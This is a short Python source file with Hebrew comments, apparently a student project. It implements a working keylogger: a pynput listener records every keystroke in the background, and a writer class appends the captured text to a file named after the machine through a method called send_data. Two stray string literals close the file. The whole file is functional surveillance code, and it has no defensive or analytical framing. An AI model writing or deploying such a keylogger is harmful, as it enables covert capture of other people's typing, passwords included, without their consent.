from pynput import keyboard
from IKeyLogger import IKeyLogger
from Iwriter import IWriter
import time

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.buffer = ""
        self.listener = None

    def _on_press(self, key):
        try:
            # תו רגיל
            self.buffer += key.char

        except AttributeError:
            # מקשים מיוחדים (כמו Enter, Space)
            if key == keyboard.Key.space:
                self.buffer += " "
            elif key == keyboard.Key.enter:
                self.buffer += "\n"
            elif key == keyboard.Key.esc:  # עצירה בלחיצה על ESC
                return False
            else:
                self.buffer += f"<{key.name}>"

    def start_logging(self) -> None:
        if not self.listener:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()
            self.listener = None

    def get_logged_keys(self) -> str:
        temp = self.buffer
        self.buffer = ""
        return temp


class FileWriter(IWriter):
    def send_data(self, data: str, machine_name: str) -> None:
        """
        מקבל מחרוזת וכותב אותה לקובץ
        """
        with open(machine_name + ".txt", "a", encoding="utf-8") as f:
            f.write(data)

"hello"
"i love you man"